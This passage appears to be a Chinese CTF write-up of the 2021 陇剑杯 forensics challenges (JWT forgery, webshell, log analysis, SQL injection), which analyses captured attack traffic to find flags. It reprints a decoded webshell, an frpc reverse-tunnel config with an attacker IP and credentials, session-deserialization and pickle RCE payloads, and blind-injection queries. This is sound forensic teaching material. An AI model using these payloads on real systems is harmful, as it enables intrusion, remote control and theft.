工具排查\n\n由于我们上面的都是自己手动排查，相对来说比较繁琐效率也低，这时候我们可以用工具进行排查，例如河马和d盾，我们直接把文件下载下来然后放d盾或者相关的web查杀工具里进行扫描查看就可以了，这里简单高效\n\n相关命令\n\n下载命令:tar -czvf 目录名字.tar.gz ./\n\n- `tar`: Tape Archive 的缩写，是一个在 Unix 和类 Unix 系统中用于文件归档的工具。它可以将多个文件和目录打包成一个单一的归档文件。\n- `-c`: 选项表示创建一个新的归档文件（create）。\n- `-z`: 选项表示通过 `gzip` 来压缩归档文件。这样可以使生成的归档文件体积更小。\n- `-v`: 选项表示详细模式（verbose）。在处理文件的过程中，会将每个被归档的文件名显示在终端上，让用户了解正在处理哪些文件。\n- `-f html.tar.gz`: 选项中的 `-f` 用于指定输出归档文件的名称。在这个例子中，生成的压缩归档文件将被命名为 `html.tar.gz`。\n- `./`: 这是指定要归档的文件或目录路径。在这个例子中，`./` 表示归档当前目录下的所有文件和目录。\n\n以入侵排查为例，我们扫描出来的结果就是\n\nid      级别  大小       CRC        修改时间             文件 (说明)\n\n------------------------------------------------------------------------------------------------------------\n\n 00001   4     88         70B2B130   21-01-01 08:00:01    \\.shell.php    『Eval后门 {参数:$_POST[cmd]}』 _\n\n00002   4     24         F46D132A   23-08-03 10:15:23    \\1.php         『Eval后门 {参数:$_POST[1]}』\n\n00003   1     655360     A3580725   23-08-03 10:45:11    \\html\\1.tar         『可疑文件』 \n\n00004   1     722        17D041A4   23-08-03 10:40:18    \\html\\index.php     『可疑文件』\n","tags":["玄机第一章应急响应"],"categories":["玄机"]},{"title":"陇剑杯2021wp","url":"/2025/04/20/陇剑杯2021wp/","content":"\n# [陇剑杯 2021]签到\n\n问题：此时正在进行的可能是______协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n用wireshark打开附件，因为是需要找什么协议的攻击，答案其实就那么几个，我们可以直接去**协议统计**那里看一下\n\n![image-20250420120432855](../image/achieve/202411/陇剑杯2021/image-20250420120432855.png)\n\n查看通过协议分类的包，比起翻海量的包一个个看，统计结果更为明了\n\n## 协议分级统计表\n\nWireshark 的 **协议分级统计表**（Protocol Hierarchy Statistics）是通过 **协议栈分层解析** 生成的，其分级逻辑遵循网络通信的 **OSI 模型** 或 **TCP/IP 协议栈**，从底层到上层逐层拆解数据包。\n\n### **协议分级的核心逻辑**\n\n#### **(1) 分层依据**\n\nWireshark 会按以下顺序解析每个数据包，并统计各层协议的占比：\n\n```\n1. **物理层**（如 Ethernet、Wi-Fi）  \n2. **网络层**（如 IPv4/IPv6）  \n3. **传输层**（如 TCP/UDP）  \n4. **应用层**（如 HTTP/DNS/SMB）  \n5. **载荷数据**（如 JSON/图片/加密流）\n```\n\n#### **(2) 统计规则**\n\n- 按分组百分比\n\n  ：统计某协议在所有数据包中出现的频率。\n\n  - 例如：`TCP 占 99.45%` 表示 99.45% 的包包含 TCP 头。\n\n- 按字节百分比\n\n  ：统计某协议在所有字节中的占比（含下层协议头开销）。\n\n  - 例如：`HTTP 占 56.3%` 表示 HTTP 及其载荷占总流量的 56.3%。\n\n这里可以发现流量包主要是TCP协议，且应用层的协议主要是HTTP（HTTP的字节占比最大），因此判断是HTTP协议的攻击。\n\n所以最终的flag\n\n```\nNSSTCTF{http}\n```\n\n# [陇剑杯 2021]jwt（问1）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n\n该网站使用了______认证方式。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n因为是网站的认证，所以我们尝试追踪HTTP流量\n\n![image-20250420121659078](../image/achieve/202411/陇剑杯2021/image-20250420121659078.png)\n\n翻啊翻看到有token\n\n![image-20250420121922165](../image/achieve/202411/陇剑杯2021/image-20250420121922165.png)\n\n```\ntoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc\n```\n\n但是这个token怎么来的呢？我又去往上翻了一下\n\n![image-20250420124424811](../image/achieve/202411/陇剑杯2021/image-20250420124424811.png)\n\n可以看到这里在传入用户名和身份参数之后服务器返回的响应包中就会产生一个token，也就是说这个其实就是基于token的登录验证，那么攻击者也就可以利用这个token去伪造身份尝试垂直越权登录\n\ntoken的话通常是用base64进行编码的，我们拿去解码一下看看\n\n![image-20250420122033001](../image/achieve/202411/陇剑杯2021/image-20250420122033001.png)\n\n可以看到是JWT认证，且整个token格式也满足JWT认证格式\n\n### JWT认证格式\n\n```\nHeader.Payload.Signature\n```\n\n所以最终的flag\n\n```\nNSSTCTF{jwt}\n```\n\n# [陇剑杯 2021]jwt（问2）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客绕过验证使用的jwt中，id和username是______。（中间使用#号隔开，例如1#admin）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n因为这里是通过token中的jwt去认证的，如果需要绕过验证的话就是伪造token了，那我们直接用过滤器搜索带有token的流量包\n\n```\nhttp contains \"token\"\n```\n\n![image-20250420123348714](../image/achieve/202411/陇剑杯2021/image-20250420123348714.png)\n\n然后我们继续追踪HTTP流去分析他的流量包\n\n![image-20250420123522964](../image/achieve/202411/陇剑杯2021/image-20250420123522964.png)\n\n根据jwt认证的格式，第二段就是我们的认证内容，也就是payload，拿去解密一下看看什么内容\n\n![image-20250420123616710](../image/achieve/202411/陇剑杯2021/image-20250420123616710.png)\n\nid是10086，username是admin，但是答案不是这个，我们继续往下翻\n\n![image-20250420123737308](../image/achieve/202411/陇剑杯2021/image-20250420123737308.png)\n\n这里看到攻击者执行了whoami的命令，此时的id和username也是10086#admin，但是响应包中显示没有权限，所以并没有绕过这个验证，但是此时我们知道攻击者会有习惯去执行whoami命令去检验身份，那我们可以直接搜索带有这个命令的流量包\n\n![image-20250420124217931](../image/achieve/202411/陇剑杯2021/image-20250420124217931.png)\n\n此时就只剩下四个包了，那么就省去了很多工作\n\n最终在第三个包下面发现了\n\n![image-20250420124700809](../image/achieve/202411/陇剑杯2021/image-20250420124700809.png)\n\n返回了root，说明此时的身份就是root，也就是绕过了身份验证拿到root了，那我们把这个token拿去解码一下看看id和username就可以了\n\n```\n{\"id\":10087,\"MapClaims\":{\"username\":\"admin\"}}\n```\n\n所以flag就是\n\n```\nNSSCTF{10087#admin}\n```\n\n# [陇剑杯 2021]jwt（问3）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客获取webshell之后，权限是______？。得到的flag请使用NSSCTF{}格式提交。\n\n其实上题就给出了答案，就是root权限，直接交就行\n\n# [陇剑杯 2021]jwt（问4）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客上传的恶意文件文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n既然是恶意上传的文件，那么请求包肯定是POST方法的，并且肯定是需要在绕过身份验证之后才能上传恶意文件的，那我们先找到刚刚的数据包并看看时间戳\n\n![image-20250420130629320](../image/achieve/202411/陇剑杯2021/image-20250420130629320.png)\n\n就是选中的这个数据包，那我们继续往下翻找\n\n![image-20250420130737697](../image/achieve/202411/陇剑杯2021/image-20250420130737697.png)\n\n可以看到这里攻击者在传入命令进行尝试\n\n![image-20250420130919276](../image/achieve/202411/陇剑杯2021/image-20250420130919276.png)\n\n这里在base64解码之后用一个重定向符将内容写入/tmp/1.c中，我们看看这个恶意文件的内容是什么\n\n![image-20250420131902239](../image/achieve/202411/陇剑杯2021/image-20250420131902239.png)\n\n在之后的请求包中就看到攻击者试图读取写入文件的内容，丢给ai分析一下\n\n![image-20250420131504290](../image/achieve/202411/陇剑杯2021/image-20250420131504290.png)\n\n确定了这个就是恶意文件，所以最终的flag就是\n\n```\nNSSCTF{1.c}\n```\n\n# [陇剑杯 2021]jwt（问5）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客在服务器上编译的恶意so文件，文件名是_____________。(请提交带有文件后缀的文件名，例如x.so)。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n需要找到一个so文件，我们继续往下看一下\n\n发现攻击者写入了一个makefile文件\n\n![image-20250420132221427](../image/achieve/202411/陇剑杯2021/image-20250420132221427.png)\n\n这段代码是一个 **Makefile 片段**，用于编译生成一个名为 `looter.so` 的动态链接库（共享库），其源代码文件是 `looter.c`。\n\n在之后的数据包中可以看到攻击者执行了make命令并且tmp目录下产生了一个so文件\n\n![image-20250420132505048](../image/achieve/202411/陇剑杯2021/image-20250420132505048.png)\n\n![image-20250420132522172](../image/achieve/202411/陇剑杯2021/image-20250420132522172.png)\n\n所以这个looter.so可能就是攻击者在服务器上编译的恶意so文件，flag就是\n\n# [陇剑杯 2021]jwt（问6）\n\n问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n也是在拿到权限后进行的操作，沿着往下翻，发现了以下内容\n\n![image-20250420133251989](../image/achieve/202411/陇剑杯2021/image-20250420133251989.png)\n\n![image-20250420133304245](../image/achieve/202411/陇剑杯2021/image-20250420133304245.png)\n\n所以这里修改的文件就是/etc/pam.d/common-auth，flag就是\n\n```\nNSSCTF{/etc/pam.d/common-auth}\n```\n\n# [陇剑杯 2021]webshell（问1）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n因为是网站被挂马，所以我们分析HTTP流量就行，因为是在登录系统使用密码，所以一般来说是POST的方式传入登录密码，不过也有可能是GET啊，但是常规来说GET传入风险很大，所以往往都是POST表单输入\n\n然后我们用过滤器查找POST请求的数据包\n\n```\nhttp.request.method == \"POST\"\n```\n\n然后看到一个数据包资源路径中有login\n\n![image-20250420134055084](../image/achieve/202411/陇剑杯2021/image-20250420134055084.png)\n\n估计这里就是登录页面，然后看到在传入username和password后有unicode加密的msg回显，解密后是登录成功，猜测这里就是登录使用的密码了\n\n```\nNSSCTF{Admin123!@#}\n```\n\n# [陇剑杯 2021]webshell（问2）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n既然是修改了日志文件的话，肯定是在登录成功后才能进行的操作，所以我们在登录成功的数据包后面开始找就行（因为是修改文件，所以也是POST请求的）\n\n![image-20250420140023904](../image/achieve/202411/陇剑杯2021/image-20250420140023904.png)\n\n这里看到了写入了一句话木马，但是回显404，估计是没写进去\n\n![image-20250420140243039](../image/achieve/202411/陇剑杯2021/image-20250420140243039.png)\n\n这里的话是日志注入的方法，可以看到返回200，并且在后面几个请求包中分别执行了其他命令\n\n![image-20250420140633249](../image/achieve/202411/陇剑杯2021/image-20250420140633249.png)\n\n说明修改的日志文件就是data/Runtime/Logs/Home/21_08_07.log，但是这里是相对路径，题目要求是绝对路径，因为是网站的日志文件，网站默认路径是/var/www/html，所以拼接一下就是绝对路径了，最终的flag就是\n\n```\nNSSCTF{/var/www/html/data/Runtime/Logs/Home/21_08_07.log}\n```\n\n或者往下翻可以看到一个数据包\n\n![image-20250420140848136](../image/achieve/202411/陇剑杯2021/image-20250420140848136.png)\n\n这里通过命令写入文件，文件的绝对路径就是/var/www/html，结合网站的日志文件的相对路径拼接就是日志文件的绝对路径了\n\n# [陇剑杯 2021]webshell（问3）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n我们先看看上面一题的最后的数据包中写入1.php文件的内容\n\n![image-20250420141112441](../image/achieve/202411/陇剑杯2021/image-20250420141112441.png)\n\n经典的一句话木马\n\n因为上传木马的操作是成功了的，那么此时就是获取到了webshell权限，那么就可以通过利用木马去执行操作，所以我们用过滤器\n\n```\nhttp contains \"1.php\"\n```\n\n![image-20250420141349947](../image/achieve/202411/陇剑杯2021/image-20250420141349947.png)\n\n筛选出来后慢慢翻一下\n\n![image-20250420141538757](../image/achieve/202411/陇剑杯2021/image-20250420141538757.png)\n\n看到对aaa传入了大量字符，我们解析一下\n\n```\n<?php\n// 关闭PHP错误显示，防止攻击者看到错误信息（@符号抑制错误提示）\n@ini_set(\"display_errors\", \"0\");\n\n// 设置脚本最大执行时间为无限制（0表示不超时）\n@set_time_limit(0);\n\n// 定义一个伪装的\"加密\"函数，实际直接返回原内容（用于混淆安全检测）\nfunction asenc($out){return $out;}\n\n// 定义输出处理函数（用于隐蔽传输数据）\nfunction asoutput(){\n    // 获取输出缓冲区中的内容\n    $output=ob_get_contents();\n    \n    // 清空并关闭输出缓冲区\n    ob_end_clean();\n    \n    // 输出固定的混淆前缀字符串（干扰安全设备检测）\n    echo \"bc\".\"0f2\";\n    \n    // 输出经过\"加密\"处理的内容（实际未加密）\n    echo @asenc($output);\n    \n    // 输出固定的混淆后缀字符串（干扰安全设备检测）\n    echo \"f797e\".\"322e0\";\n}\n\n// 开启输出缓冲，用于捕获后续所有输出内容\nob_start();\n\ntry{\n    // 获取当前执行脚本的绝对路径所在目录\n    $D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);\n    \n    // 如果获取失败，尝试通过PATH_TRANSLATED获取（IIS服务器备用方案）\n    if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);\n    \n    // 初始化结果字符串，包含目录路径和制表符分隔符\n    $R=\"{$D}\\t\";\n    \n    // 判断操作系统类型：检查路径是否以/开头（Linux/Unix系统）\n    if(substr($D,0,1)!=\"/\"){\n        // Windows系统：遍历所有可能的盘符（C到Z）\n        foreach(range(\"C\",\"Z\") as $L)\n            // 检查该盘符是否存在\n            if(is_dir(\"{$L}:\"))\n                // 将存在的盘符追加到结果字符串\n                $R.=\"{$L}:\";\n    }else{\n        // Linux系统：直接追加根目录标识\n        $R.=\"/\";\n    }\n    \n    // 追加制表符分隔符\n    $R.=\"\\t\";\n    \n    // 尝试获取当前进程的用户信息（如果POSIX函数可用）\n    $u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\";\n    \n    // 获取用户名：优先使用POSIX获取的用户名，否则使用PHP当前用户\n    $s=($u)?$u[\"name\"]:@get_current_user();\n    \n    // 追加操作系统详细信息（包括系统类型、主机名、内核版本等）\n    $R.=php_uname();\n    \n    // 追加当前用户名并用制表符分隔\n    $R.=\"\\t{$s}\";\n    \n    // 输出收集到的所有系统信息\n    echo $R;\n    \n}catch(Exception $e){\n    // 如果发生异常，输出错误信息（前缀带ERROR://标识）\n    echo \"ERROR://\".$e->getMessage();\n}\n\n// 调用输出处理函数（添加混淆字符）\nasoutput();\n\n// 立即终止脚本执行\ndie();\n\n```\n\n这个脚本的话其实就是获取一些服务器的基本信息并做了一些隐藏的功能\n\n![image-20250420142134039](../image/achieve/202411/陇剑杯2021/image-20250420142134039.png)\n\n可以看到回显了当前用户的信息就是www-data，这是常见的用户名，直接提交就行\n\n```\nNSSCTF{www-data}\n```\n\n不过我这个估计不是常规解啊，预期解是通过搜查whoami命令去查看\n\n![image-20250420142640157](../image/achieve/202411/陇剑杯2021/image-20250420142640157.png)\n\n第二条\n\n![image-20250420142656550](../image/achieve/202411/陇剑杯2021/image-20250420142656550.png)\n\n# [陇剑杯 2021]webshell（问4）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n这个在上面就看到了，是1.php文件，所以flag就是\n\n```\nNSSCTF{1.php}\n```\n\n# [陇剑杯 2021]webshell（问5）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：上传文件的话，首要的还是搜查POST请求的数据包\n\n在第37个流和第39个流中\n\n![image-20250420143556011](../image/achieve/202411/陇剑杯2021/image-20250420143556011.png)\n\n![image-20250420143606262](../image/achieve/202411/陇剑杯2021/image-20250420143606262.png)\n\n都是执行了查看目录文件的命令，但是后者多出了一个frpc.ini，那么问题就出现在第38个流中\n\n![image-20250420143715005](../image/achieve/202411/陇剑杯2021/image-20250420143715005.png)\n\n分析一下代码\n\n```php\naaa=@ini_set(\"display_errors\", \"0\");@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \"28\".\"f72\";echo @asenc($output);echo \"f486\".\"11f4\";}ob_start();try{$f=base64_decode(substr($_POST[\"j68071301598f\"],2));$c=$_POST[\"xa5d606e67883a\"];$c=str_replace(\"\\r\",\"\",$c);$c=str_replace(\"\\n\",\"\",$c);$buf=\"\";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode(\"%\".substr($c,$i,2));echo(@fwrite(fopen($f,\"a\"),$buf)?\"1\":\"0\");;}catch(Exception $e){echo \"ERROR://\".$e->getMessage();};asoutput();die();\n&j68071301598f=FBL3Zhci93d3cvaHRtbC9mcnBjLmluaQ==&xa5d606e67883a=5B636F6D6D6F6E5D0A7365727665725F61646472203D203139322E3136382E3233392E3132330A7365727665725F706F7274203D20373737380A746F6B656E3D586133424A66326C35656E6D4E365A3741386D760A0A5B746573745F736F636B355D0A74797065203D207463700A72656D6F74655F706F7274203D383131310A706C7567696E203D20736F636B73350A706C7567696E5F75736572203D2030484446743136634C514A0A706C7567696E5F706173737764203D204A544E32373647700A7573655F656E6372797074696F6E203D20747275650A7573655F636F6D7072657373696F6E203D20747275650A\n```\n\n这里有两个参数，&j68071301598f=FBL3Zhci93d3cvaHRtbC9mcnBjLmluaQ==的值拿去解码可以得到一个文件路径（需要去掉前两个字符）\n\n![image-20250420144132846](../image/achieve/202411/陇剑杯2021/image-20250420144132846.png)\n\n然后我们看看主要攻击逻辑\n\n```\n$f = base64_decode(substr($_POST[\"j68071301598f\"],2));  // 解码目标文件路径\n$c = $_POST[\"xa5d606e67883a\"];                         // 获取十六进制数据\n$c = str_replace(\"\\r\\n\", \"\", $c);                       // 清理换行符\n$buf = \"\";\n// 十六进制转原始数据（每2字符为一组，添加%后URL解码）\nfor($i=0; $i<strlen($c); $i+=2) {\n    $buf .= urldecode(\"%\".substr($c, $i, 2));\n}\n// 追加写入文件，返回1（成功）或0（失败）\necho @fwrite(fopen($f, \"a\"), $buf) ? \"1\" : \"0\";\n\n```\n\n所以第二个参数的值就是需要写入/var/www/html/frpc.ini的文件内容，我们解码看看文件内容\n\n```\n[common]\nserver_addr = 192.168.239.123  # 攻击者控制的FRP服务端IP\nserver_port = 7778              # 服务端端口\ntoken = Xa3BJf2l5enmN6Z7A8mv    # 认证令牌\n\n[test_sock5]\ntype = tcp                      # 代理类型为TCP\nremote_port = 8111              # 暴露在公网的端口\nplugin = socks5                 # 插件类型（SOCKS5代理）\nplugin_user = 0HDFt16cLQJ       # 代理用户名\nplugin_passwd = JTN276Gp        # 代理密码\nuse_encryption = true           # 启用加密\nuse_compression = true          # 启用压缩\n```\n\n就是设置反向代理搭建隧道的一个配置文件，通过FRP建立反向代理隧道，将受害服务器变成SOCKS5代理\n\n那么代理工具名字就是frpc\n\n```\nNSSCTF{frpc}\n```\n\n# [陇剑杯 2021]webshell（问6）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n需要找到回连服务端ip，首先得知道什么是回连服务端IP\n\n## 回连服务端IP是什么\n\n**回连服务端IP**（也称为 **C2（Command & Control）服务器IP**）是黑客控制的远程服务器地址，用于与被入侵的计算机（受害机）建立隐蔽通信通道，从而远程操控目标设备。\n\n黑客在攻击过程中，通常需要让受害机（被入侵的服务器/主机）主动连接自己的服务器，而不是直接攻击目标（因为防火墙会拦截外部攻击）。这种方式称为 **反向连接（Reverse Connection）**，因为反向代理的话是受害机器去连接攻击机，所以这里就是回连，那服务端也就是我们的攻击机，上一题的配置文件内容中已经提到了攻击机的ip，直接交就是\n\n```\nNSSCTF{192.168.239.123}\n```\n\n# [陇剑杯 2021]webshell（问7）\n\n问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：这个在配置文件中也是有的\n\n```\nNSSCTF{0HDFt16cLQJ#JTN276Gp}\n```\n\n# [陇剑杯 2021]日志分析（问1）\n\n问题：单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n先看看日志文件的构成吧\n\n日志文件的结构\n\n```\n[客户端IP] - [用户名] [时间戳] \"[请求方法] [URL] [协议]\" [状态码] [响应大小] \"[来源页]\" \"[User-Agent]\"\n```\n\n然后在日志文件中可以看到似乎攻击者是做了一个目录扫描的操作\n\n![image-20250420145657704](../image/achieve/202411/陇剑杯2021/image-20250420145657704.png)\n\n例如这里200状态码说明该路径是存在的，那我们翻找一下是否存在源码泄露，源码泄露的方式无疑就几种，.git源码泄露，SVN泄露，www.zip压缩文件等，继续往下翻就可以看到\n\n![image-20250420150025787](../image/achieve/202411/陇剑杯2021/image-20250420150025787.png)\n\n存在www.zip备份文件，估计就是源码泄露文件了，拿去提交就行\n\n```\nNSSCTF{www.zip}\n```\n\n# [陇剑杯 2021]日志分析（问2）\n\n问题：单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n既然是tmp目录中的，那么日志中的数据肯定会包含tmp字样，直接搜就有\n\n```\n172.17.0.1 - - [07/Aug/2021:01:38:20 +0000] \"GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\"\n\n172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] \"GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\"\n\n```\n\n有url编码，拿去解码一下\n\n```\n172.17.0.1 - - [07/Aug/2021:01:38:20 +0000] \"GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\"\n\n172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] \"GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\"\n```\n\n很经典的session反序列化，那么这里的话文件名就显而易见了\n\n```\nNSSCTF{sess_car}\n```\n\n# [陇剑杯 2021]日志分析（问3）\n\n问题：单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF{}格式提交。\n\n解题：也是在上面一题的payload中，了解一下这段payload就明白了，这里是使用 `SplFileObject` 内置类去读取敏感文件（如 `/flag`）。\n\n```\nNSSCTF{SplFileObject}\n```\n\n# [陇剑杯 2021]SQL注入（问1）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客在注入过程中采用的注入手法叫_____________。（格式为4个汉字，例如“拼搏努力”）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：先打开日志文件看一下\n\n![image-20250420201730603](../image/achieve/202411/陇剑杯2021/image-20250420201730603.png)\n\n然后翻看了一下啊，基本上都是一种注入手法那就是布尔盲注\n\n```\nNSSCTF{布尔盲注}\n```\n\n# [陇剑杯 2021]SQL注入（问2）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_____________。（格式为“数据库名#表名#字段名”，例如database#table#column）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：熟悉sql注入的都知道，在进行常规注入的时候都会用到库名，表名和字段名，直接搜就行\n\n```\ntable_schema\n```\n\n![image-20250420202235408](../image/achieve/202411/陇剑杯2021/image-20250420202235408.png)\n\n![image-20250420202355254](../image/achieve/202411/陇剑杯2021/image-20250420202355254.png)\n\n![image-20250420202435789](../image/achieve/202411/陇剑杯2021/image-20250420202435789.png)\n\n因为常规注入的时候会用where语句去指定数据库或者数据表，所以直接搜就行\n\n```\n数据库名：sqli\n数据表名：flag\n字段名：flag\n```\n\n拿去交就行\n\n```\nNSSCTF{sqli#flag#flag}\n```\n\n# [陇剑杯 2021]SQL注入（问3）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客最后获取到的flag字符串为_____________。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n那就是爆数据了，那我们从这里开始找\n\n![image-20250420202927781](../image/achieve/202411/陇剑杯2021/image-20250420202927781.png)\n\n因为之前我们有了解到，在每条数据中都会有响应大小的字样，也就是类似429，425，424等就是响应大小，那么我们可以根据这个去潘判断字符判断是否正确，因为这里用了if语句，条件满足的情况只有一种，那我们中响应大小跟其他的相差很大的就是正确的了\n\n![image-20250420203241730](../image/achieve/202411/陇剑杯2021/image-20250420203241730.png)\n\n这个明显差别很大，并且字符在我们预料之内，我们可以写脚本这样可以更快一点检索出来\n\n```python\nimport re\nimport urllib.parse\n\narr = []\nwith open(r\"access.log\", 'r') as f:\n    pattern = r'sqli\\.flag\\),(\\d+).+\\'(.+)\\''\n    for i in f:\n        m = re.search(pattern, i)\n        if m:\n            #print(i)\n            arr.append(m.group(1, 2))\n            #print(m.group(1, 2))\nfor i in range(len(arr) - 1):\n    if arr[i][0] != arr[i + 1][0]:\n        if '%' in arr[i][1]:\n            print(urllib.parse.unquote(arr[i][1]), end='')\n        else:\n            print(arr[i][1], end='')\n\n```\n\n```\nflag{deddcd67-bcfd-487e-b940-1217e668c7db}\n```\n\n这里的话其实第一个就是捕获所有的爆数据的查询语句，第二个就是一个很好的思路\n\n假设我们\n\n```\narr = [('1','a'), ('1','b'), ('2','x')]\n```\n\n如果查询语句执行\n\n```\n1 and if(substr((select flag from sqli.flag),1,1) = 'b',1,(select table_name from information_schema.tables))\n```\n\n如果b是对的，那么就不会再使用`substr((select flag from sqli.flag),1,1)`，而是转向第二个字符进行注入\n\n```\n1 and if(substr((select flag from sqli.flag),2,1) = 'x',1,(select table_name from information_schema.tables))\n```\n\n所以\n\n```\n若i=0，arr[0][0] = '1'，arr[1][0] = '1' → 不满足条件，跳过。\n若i=1，arr[1][0] = '1'，arr[2][0] = '2' -> 满足条件，打印出来\n```\n\n然后最终的flag就是\n\n```\nNSSCTF{deddcd67-bcfd-487e-b940-1217e668c7db}\n```\n\n# [陇剑杯 2021]简单日志分析（问1）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n打开看到一堆404，猜测是在扫描目录，然后发现一个user参数\n\n![image-20250420211504918](../image/achieve/202411/陇剑杯2021/image-20250420211504918.png)\n\n![image-20250420211635926](../image/achieve/202411/陇剑杯2021/image-20250420211635926.png)\n\n有点像pickle反序列化，但是user参数肯定是对的\n\n```\nNSSCTF{user}\n```\n\n# [陇剑杯 2021]简单日志分析（问2）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n全部看完了一共三个对user参数的操作\n\n```\n127.0.0.1 - - [07/Aug/2021 10:43:12] \"GET /?user=STAKcDAKMFMnd2hvYW1pJwpwMQowKGcwCmxwMgowKEkwCnRwMwowKGczCkkwCmRwNAowY29zCnN5c3RlbQpwNQowZzUKKGcxCnRSLg== HTTP/1.1\" 500 -\n127.0.0.1 - - [07/Aug/2021 